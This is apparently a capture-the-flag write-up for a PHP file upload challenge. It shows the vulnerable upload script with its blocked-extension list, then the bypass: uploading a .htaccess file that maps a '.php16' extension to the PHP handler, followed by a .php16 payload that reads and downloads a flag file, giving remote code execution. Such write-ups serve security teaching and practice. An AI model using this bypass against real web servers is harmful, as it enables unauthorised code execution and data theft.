### Port 20055 \[Web]

This wa PHP file upload challenge. We are provided with the following source code.

```php
<?php
    $storage_dir = "file_uploads/";
    $full_storage_path = $storage_dir . basename($_FILES["fileName"]["name"]);
    $file_ext = pathinfo($full_storage_path, PATHINFO_EXTENSION);
    $file_ext = strtolower($file_ext);
    $blocked_ext = ["php", "php2", "php3", "php4", "php5", "php6", "php7", "php8", "phps", "pht", "phtm", "phar", "phtml", "pgif", "shtml", "html", "inc", "cgi", "asp", "aspx", "config", "pl", "py", "rs", "rb", "vbhtml", "vbtm", "vb", "phpt", "phtml"];
    echo($file_ext);
    if (in_array($file_ext, $blocked_ext, true) === true){
    echo("<html><h1>Blocked file extension detected! File upload blocked!</h1></html>");
    exit(1);
    }
    
    // Check file size
    if ($_FILES["fileName"]["size"] > 500000) {
    echo("<html><p>Sorry, your file is too large.</p></html>");
    exit(2);
    }
    
    // Move the uploaded file
    if (move_uploaded_file($_FILES["fileName"]["tmp_name"], $full_storage_path) === true){
    echo("<html><p>File has been uploaded successfully and is now available <a href='/$full_storage_path'>here</a>! But can you figure out how to execute it?</html>");
    }
    else{
    echo("<html><p>File was not successfully uploaded!</p></html>");
    }
?>
```

While most common PHP file extensions are blocked, `.htaccess` was not!

We could upload a `.htaccess` file to tell Apache to interpret some arbitrary file extension as a PHP file (e.g. `.php16`).

```http
Content-Disposition: form-data; name="fileName"; filename=".htaccess"
Content-Type: text/html

AddHandler application/x-httpd-php .php16      # Say all file with extension .php16 will execute php
```

Then, uploading any file with the `.php16` extension results in RCE, and we can download the flag..

```http
Content-Disposition: form-data; name="fileName"; filename="test.php16"
Content-Type: text/html

<?php
$file = '/flag.png';

if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
```
